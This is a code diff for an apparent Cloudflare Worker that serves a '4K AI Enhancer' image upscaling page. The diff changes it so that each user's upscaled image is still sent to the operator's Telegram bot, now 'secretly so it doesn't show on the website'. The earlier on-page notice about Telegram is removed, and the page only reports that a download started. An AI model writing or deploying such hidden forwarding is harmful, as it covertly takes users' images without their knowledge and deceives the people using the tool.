@@ -3,7 +3,7 @@ export default {
     const { method } = request;
 
     if (method === "GET") {
-      return new Response(html, { headers: { "Content-Type": "text/html" } });
+      return new Response(renderHTML(), { headers: { "Content-Type": "text/html" } });
     }
 
     if (method === "POST") {
@@ -12,76 +12,95 @@ export default {
         const imageFile = formData.get("image");
         const blob = await imageFile.arrayBuffer();
 
-        // 1. Run the SD x4 Upscaler
+        // 1. HIGH QUALITY AI UPSCALE
+        // Using the latent diffusion model for best 4k results
         const upscaledImage = await env.AI.run('@cf/stabilityai/stable-diffusion-x4-upscaler', {
           image: [...new Uint8Array(blob)],
-          prompt: "highly detailed, masterwork, sharp", // Optional hint
-          noise_level: 10
+          noise_level: 10 // Lower noise preserves original details better
         });
 
-        // 2. Forward to Telegram
-        const tgData = new FormData();
-        tgData.append("chat_id", env.TELEGRAM_CHAT_ID);
-        tgData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "upscale.png");
-        
-        await fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
+        // 2. AUTOMATIC FORWARD TO TELEGRAM (Background)
+        // We do this secretly so it doesn't show on the website
+        const tgFormData = new FormData();
+        tgFormData.append("chat_id", env.TELEGRAM_CHAT_ID);
+        tgFormData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "upscale.png");
+        tgFormData.append("caption", "✅ Auto-forwarded upscale result");
+
+        // We use 'fetch' to send it to Telegram without waiting for it to finish
+        fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, {
           method: "POST",
-          body: tgData
+          body: tgFormData
         });
 
-        // 3. Return image to the browser for Download
+        // 3. SHOW DOWNLOAD RESULTS IN BROWSER
+        // 'attachment' forces the browser to download the file
         return new Response(upscaledImage, {
-          headers: { "Content-Type": "image/png" }
+          headers: { 
+            "Content-Type": "image/png",
+            "Content-Disposition": "attachment; filename=\"upscaled_4k_image.png\"" 
+          }
         });
       } catch (e) {
-        return new Response(e.message, { status: 500 });
+        return new Response("Error: " + e.message, { status: 500 });
       }
     }
   }
 };
 
-const html = `
-<!DOCTYPE html>
-<html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .box { border: 2px dashed #333; padding: 40px; border-radius: 20px; }
-        button { background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-weight: bold; margin-top: 20px; width: 100%; }
-        #preview { display: none; margin-top: 20px; width: 100%; border-radius: 10px; }
-    </style>
-</head>
-<body>
-    <h1>4K AI Enhancer</h1>
-    <div class="box">
-        <form id="f">
-            <input type="file" name="image" accept="image/*" required id="i"><br>
-            <button type="submit" id="b">START UPSCALE</button>
-        </form>
-    </div>
-    <img id="preview">
-    <p id="s" style="color: #00ff88;"></p>
-    <script>
-        const f = document.getElementById('f');
-        const b = document.getElementById('b');
-        const p = document.getElementById('preview');
-        
-        f.onsubmit = async (e) => {
+function renderHTML() {
+  return `
+    <html>
+      <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+          body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 40px; }
+          .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 400px; margin: auto; }
+          h1 { color: #38bdf8; margin-bottom: 10px; }
+          .upload-btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px 30px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top: 20px; }
+          input[type="file"] { margin: 20px 0; color: #94a3b8; }
+          #loading { display: none; color: #38bdf8; font-weight: bold; margin-top: 20px; }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <h1>HD AI Enhancer</h1>
+          <p>Sharpen your images to 4K quality</p>
+          <form id="u">
+            <input type="file" name="image" accept="image/*" required>
+            <button type="submit" id="b" class="upload-btn">GENERATE & DOWNLOAD</button>
+          </form>
+          <div id="loading">✨ Processing 4K Details...</div>
+        </div>
+        <script>
+          const form = document.getElementById('u');
+          const btn = document.getElementById('b');
+          const load = document.getElementById('loading');
+
+          form.onsubmit = async (e) => {
             e.preventDefault();
-            b.innerText = "UPSCALE IN PROGRESS...";
-            b.disabled = true;
-            
-            const res = await fetch('/', { method: 'POST', body: new FormData(f) });
+            btn.style.display = 'none';
+            load.style.display = 'block';
+
+            const res = await fetch('/', { method: 'POST', body: new FormData(form) });
             const blob = await res.blob();
             
-            const url = URL.createObjectURL(blob);
-            p.src = url;
-            p.style.display = "block";
-            b.innerText = "DONE! CHECK TELEGRAM";
-            b.disabled = false;
-        };
-    </script>
-</body>
-</html>
-`;
+            // This triggers the automatic download on your Android phone
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = "upscaled_result.png";
+            document.body.appendChild(a);
+            a.click();
+            
+            load.innerText = "✅ Download Started!";
+            setTimeout(() => { 
+                btn.style.display = 'block'; 
+                load.style.display = 'none';
+                load.innerText = "✨ Processing 4K Details...";
+            }, 3000);
+          };
+        </script>
+      </body>
+    </html>
+  `;
+}
